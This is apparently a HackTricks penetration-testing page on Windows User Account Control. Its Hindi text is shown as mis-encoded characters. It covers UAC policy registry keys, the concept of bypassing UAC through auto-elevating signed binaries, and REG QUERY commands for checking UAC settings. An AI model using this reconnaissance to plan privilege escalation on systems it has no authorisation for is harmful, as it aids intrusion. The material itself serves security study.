# UAC - User Account Control

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® **HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á **‡§µ‡§∞‡•ç‡§ï‡§´‡§º‡•ç‡§≤‡•ã** ‡§¨‡§®‡§æ‡§è‡§Ç ‡§î‡§∞ **‡§∏‡•ç‡§µ‡§§: ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ** ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§Ç ‡§¶‡•Å‡§®‡§ø‡§Ø‡§æ ‡§ï‡•á **‡§∏‡§¨‡§∏‡•á ‡§â‡§®‡•ç‡§®‡§§** ‡§∏‡§Æ‡•Å‡§¶‡§æ‡§Ø ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ‡•§\
‡§Ü‡§ú ‡§π‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö‡•á‡§Ç:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ‡§è‡§ï ‡§∏‡•Å‡§µ‡§ø‡§ß‡§æ ‡§π‡•à ‡§ú‡•ã **‡§â‡§ö‡•ç‡§ö ‡§ó‡§§‡§ø‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§π‡§Æ‡§§‡§ø ‡§™‡•ç‡§∞‡•â‡§Æ‡•ç‡§™‡•ç‡§ü** ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® `‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ` ‡§∏‡•ç‡§§‡§∞ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§è‡§ï **‡§â‡§ö‡•ç‡§ö ‡§∏‡•ç‡§§‡§∞** ‡§ï‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ê‡§∏‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã **‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡•ç‡§∑‡§§‡§ø ‡§™‡§π‡•Å‡§Ç‡§ö‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§ú‡§¨ UAC ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§î‡§∞ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§π‡§Æ‡•á‡§∂‡§æ **‡§è‡§ï ‡§ó‡•à‡§∞-‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡§§‡•á ‡§π‡•à‡§Ç** ‡§ú‡§¨ ‡§§‡§ï ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§á‡§® ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•ã‡§Ç/‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§®‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•Ä ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï‡•É‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ‡•§ ‡§Ø‡§π ‡§è‡§ï ‡§∏‡•Å‡§µ‡§ø‡§ß‡§æ ‡§∏‡•Å‡§®‡§ø‡§§‡§ø ‡§π‡•à ‡§ú‡•ã ‡§Ö‡§®‡§ú‡§æ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§®‡•ã‡§Ç ‡§∏‡•á ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§∞‡§ñ‡§§‡•Ä ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏‡•á ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§∏‡•Ä‡§Æ‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ‡•§

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§∏‡•ç‡§§‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

‡§ú‡§¨ UAC ‡§≤‡§æ‡§ó‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§è‡§ï ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã 2 ‡§ü‡•ã‡§ï‡§® ‡§Æ‡§ø‡§≤‡§§‡•á ‡§π‡•à‡§Ç: ‡§è‡§ï ‡§Æ‡§æ‡§®‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•Å‡§Ç‡§ú‡•Ä, ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§î‡§∞ ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§µ‡§æ‡§≤‡§æ‡•§

‡§Ø‡§π [‡§™‡•É‡§∑‡•ç‡§†](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC ‡§ï‡§æ‡§Æ ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§∏‡•ç‡§§‡§æ‡§∞ ‡§∏‡•á ‡§ö‡§∞‡•ç‡§ö‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§≤‡•â‡§ó‡§ë‡§® ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§Ö‡§®‡•Å‡§≠‡§µ, ‡§î‡§∞ UAC ‡§µ‡§æ‡§∏‡•ç‡§§‡•Å‡§ï‡§≤‡§æ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡•§ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§∏‡•ç‡§§‡§∞ ‡§™‡§∞ (secpol.msc ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á) ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡•Ä‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á UAC ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§µ‡§ø‡§®‡•ç‡§Ø‡§∏‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§Ø‡§æ ‡§∏‡§Æ‡•Ç‡§π ‡§®‡•Ä‡§§‡§ø ‡§µ‡§∏‡•ç‡§§‡•Å‡§ì‡§Ç (GPO) ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§µ‡§ø‡§®‡•ç‡§Ø‡§∏‡•ç‡§§ ‡§î‡§∞ ‡§™‡•ç‡§∞‡§∏‡§æ‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§è‡§ï ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§°‡•ã‡§Æ‡•á‡§® ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç‡•§ ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó‡•ç‡§∏ ‡§ï‡•Ä ‡§µ‡§ø‡§∏‡•ç‡§§‡§æ‡§∞ ‡§∏‡•á ‡§ö‡§∞‡•ç‡§ö‡§æ [‡§Ø‡§π‡§æ‡§Å](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à‡•§ UAC ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•á‡§ü ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§®‡•á ‡§µ‡§æ‡§≤‡•á 10 ‡§∏‡§Æ‡•Ç‡§π ‡§®‡•Ä‡§§‡§ø ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó‡•ç‡§∏ ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à‡§Ç‡•§ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§§‡§æ‡§≤‡§ø‡§ï‡§æ ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à:

| ‡§∏‡§Æ‡•Ç‡§π ‡§®‡•Ä‡§§‡§ø ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó                                                                                                                                                                                                                                                                                                                                                           | ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§ï‡•Å‡§Ç‡§ú‡•Ä                | ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### UAC ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§∏‡§ø‡§¶‡•ç‡§ß‡§æ‡§Ç‡§§

‡§ï‡•Å‡§õ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ **‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§ö‡•ç‡§ö ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•Ä ‡§∏‡§Æ‡•Ç‡§π** ‡§Æ‡•á‡§Ç **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç** ‡§§‡•ã **‡§ë‡§ü‡•ã‡§á‡§≤‡•á‡§µ‡•á‡§ü‡•á‡§° ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§á‡§® ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä‡§ú ‡§Æ‡•á‡§Ç ‡§â‡§®‡§ï‡•á _**‡§Æ‡•à‡§®‡§ø‡§´‡•á‡§∏‡•ç‡§ü**_ ‡§Æ‡•á‡§Ç _**autoElevate**_ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§æ‡§® _**True**_ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã **‡§Æ‡§æ‡§á‡§ï‡•ç‡§∞‡•ã‡§∏‡•â‡§´‡•ç‡§ü ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞‡§ø‡§§** ‡§≠‡•Ä ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶, **UAC** ‡§ï‡•ã **‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è (‡§Æ‡§ß‡•ç‡§Ø ‡§Ö‡§≠‡§ø‡§ï‡§∞‡§£ ‡§∏‡•ç‡§§‡§∞ ‡§∏‡•á ‡§â‡§ö‡•ç‡§ö ‡§∏‡•ç‡§§‡§∞ ‡§™‡§∞ ‡§â‡§ö‡•ç‡§ö‡§æ‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è) ‡§ï‡•Å‡§õ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä‡§ú ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§µ‡•á **‡§µ‡§ø‡§µ‡§ø‡§ß ‡§ï‡•ã‡§°** ‡§ï‡•ã **‡§ö‡§≤‡§æ ‡§∏‡§ï‡•á‡§Ç** ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï **‡§â‡§ö‡•ç‡§ö ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•á ‡§Ö‡§≠‡§ø‡§ï‡§∞‡§£ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ** ‡§∏‡•á ‡§ö‡§≤‡§æ‡§à ‡§ú‡§æ‡§è‡§ó‡•Ä‡•§

‡§Ü‡§™ ‡§â‡§™‡§ï‡§∞‡§£ _**sigcheck.exe**_ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡§æ _**‡§Æ‡•à‡§®‡§ø‡§´‡•á‡§∏‡•ç‡§ü**_ ‡§ú‡§æ‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§î‡§∞ ‡§Ü‡§™ _Process Explorer_ ‡§Ø‡§æ _Process Monitor_ (Sysinternals ‡§ï‡§æ) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡§æ **‡§Ö‡§≠‡§ø‡§ï‡§∞‡§£ ‡§∏‡•ç‡§§‡§∞** ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

### UAC ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö

UAC ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à ‡§Ø‡§æ ‡§®‡§π‡•Ä‡§Ç, ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞‡•á‡§Ç:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
‡§Ø‡§¶‡§ø ‡§Ø‡§π **`1`** ‡§π‡•à ‡§§‡•ã UAC **‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø** ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§Ø‡§π **`0`** ‡§π‡•à ‡§Ø‡§æ ‡§Ø‡§π **‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§®‡§π‡•Ä‡§Ç** ‡§π‡•à, ‡§§‡•ã UAC **‡§®‡§ø‡§∑‡•ç‡§ï‡•ç‡§∞‡§ø‡§Ø** ‡§π‡•à‡•§

‡§´‡§ø‡§∞, ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç **‡§ï‡•å‡§® ‡§∏‡§æ ‡§∏‡•ç‡§§‡§∞** ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* ‡§Ø‡§¶‡§ø **`0`** ‡§π‡•à ‡§§‡•ã, UAC ‡§™‡•ç‡§∞‡•â‡§Æ‡•ç‡§™‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§ó‡§æ (‡§ú‡•à‡§∏‡•á **‡§Ö‡§ï‡•ç‡§∑‡§Æ**)
* ‡§Ø‡§¶‡§ø **`1`** ‡§π‡•à ‡§§‡•ã ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§ï‡•ã ‡§â‡§ö‡•ç‡§ö ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ ‡§î‡§∞ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•á ‡§≤‡§ø‡§è **‡§™‡•Ç‡§õ‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ** (‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§™‡§∞)
* ‡§Ø‡§¶‡§ø **`2`** (**‡§π‡§Æ‡•á‡§∂‡§æ ‡§Æ‡•Å‡§ù‡•á ‡§∏‡•Ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç**) UAC ‡§π‡§Æ‡•á‡§∂‡§æ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§∏‡•á ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Ç‡§õ‡•á‡§ó‡§æ ‡§ú‡§¨ ‡§µ‡§π ‡§â‡§ö‡•ç‡§ö ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•Å‡§õ ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à (‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§™‡§∞)
